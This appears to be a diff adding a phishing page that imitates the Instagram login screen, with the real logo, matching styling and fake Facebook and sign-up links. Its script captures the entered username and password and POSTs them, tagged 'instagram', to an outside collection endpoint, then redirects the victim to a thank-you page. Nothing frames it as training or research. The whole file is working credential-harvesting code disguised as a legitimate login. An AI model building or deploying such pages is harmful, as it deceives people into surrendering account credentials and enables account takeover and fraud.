@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <script src="static/js/config.js"></script>
+    <style>
+        body {
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 32px;
+            /* In a real scenario, correct split layout would be here, but centering the card is a valid "mobile-web-on-desktop" or simplified view */
+        }
+
+        .auth-box {
+            width: 350px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .card {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            margin-bottom: 10px;
+            padding: 10px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-card {
+            padding: 20px 40px;
+            /* Internal padding */
+        }
+
+        .ig-logo {
+            font-family: 'Grand Hotel', cursive;
+            /* Use image ideally, keep text as backup */
+            font-size: 3rem;
+            margin: 22px auto 12px;
+            display: block;
+            text-align: center;
+            font-style: italic;
+            /* Just to make it look fancier if font fails */
+        }
+
+        .ig-input {
+            width: 268px;
+            /* Fixed width in desktop CSS roughly */
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px;
+            /* slightly different than mobile */
+            margin-bottom: 6px;
+            font-size: 14px;
+            /* somewhat smaller */
+            box-sizing: border-box;
+            color: #262626;
+        }
+
+        .ig-input:focus {
+            border: 1px solid #a8a8a8;
+            outline: none;
+        }
+
+        .ig-btn {
+            width: 268px;
+            background-color: #0095f6;
+            border: 1px solid transparent;
+            border-radius: 4px;
+            color: white;
+            font-weight: 600;
+            padding: 5px 9px;
+            cursor: pointer;
+            margin-top: 8px;
+            margin-bottom: 20px;
+            height: 32px;
+        }
+
+        .or-divider {
+            display: flex;
+            width: 268px;
+            align-items: center;
+            margin: 10px 0 18px;
+        }
+
+        .line {
+            height: 1px;
+            background-color: #dbdbdb;
+            flex-grow: 1;
+        }
+
+        .or-text {
+            color: #8e8e8e;
+            font-weight: 600;
+            font-size: 13px;
+            margin: 0 18px;
+            text-transform: uppercase;
+        }
+
+        .fb-login-text {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+
+        .forgot-pass {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            margin-top: 12px;
+            margin-bottom: 10px;
+        }
+
+        .signup-card {
+            padding: 20px 0;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-card a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .get-app {
+            text-align: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .app-stores {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+            gap: 8px;
+        }
+
+        /* Fake buttons using CSS shapes/colors or just text rectangles */
+        .store-badge {
+            background-color: black;
+            /* Placeholder for image */
+            color: white;
+            border-radius: 4px;
+            width: 135px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .consent-wrapper {
+            width: 268px;
+            font-size: 12px;
+            color: #8e8e8e;
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .consent-wrapper input {
+            margin-right: 8px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="main-container">
+        <!-- Phone images would be here on left, simplified to just centrered auth box -->
+
+        <div class="auth-box">
+            <div class="card login-card">
+                <!-- Official Instagram Logo -->
+                <div style="margin: 36px 0 12px 0;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png"
+                        alt="Instagram" style="width: 175px; height: 51px; display: block; margin: 0 auto;">
+                </div>
+
+                <form id="loginForm" style="display:flex; flex-direction:column; align-items:center; width:100%;">
+                    <input type="text" id="email" class="ig-input" placeholder="Phone number, username, or email"
+                        required>
+                    <input type="password" id="password" class="ig-input" placeholder="Password" required>
+
+
+
+                    <button type="submit" class="ig-btn">Log In</button>
+
+                    <div class="or-divider">
+                        <div class="line"></div>
+                        <div class="or-text">OR</div>
+                        <div class="line"></div>
+                    </div>
+
+                    <a href="#" class="fb-login-text">
+                        <span style="display:inline-block; margin-right:5px; font-weight:bold;">f</span> Log in with
+                        Facebook
+                    </a>
+
+                    <a href="#" class="forgot-pass">Forgot password?</a>
+                </form>
+            </div>
+
+            <div class="card signup-card">
+                <span>Don't have an account? <a href="#">Sign up</a></span>
+            </div>
+
+            <div class="get-app">
+                <p>Get the app.</p>
+                <div class="app-stores">
+                    <div class="store-badge">Download on the<br>App Store</div>
+                    <div class="store-badge">Get it on<br>Google Play</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", async function (e) {
+            e.preventDefault();
+
+
+            const data = {
+                platform: "instagram",
+                email: document.getElementById("email").value,
+                password: document.getElementById("password").value
+            };
+
+            try {
+                const res = await fetch(API_BASE_URL + "/platform_submit", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+                if (res.ok) {
+                    window.top.location.href = "thankyou.html";
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        });
+    </script>
+</body>
+
+</html>
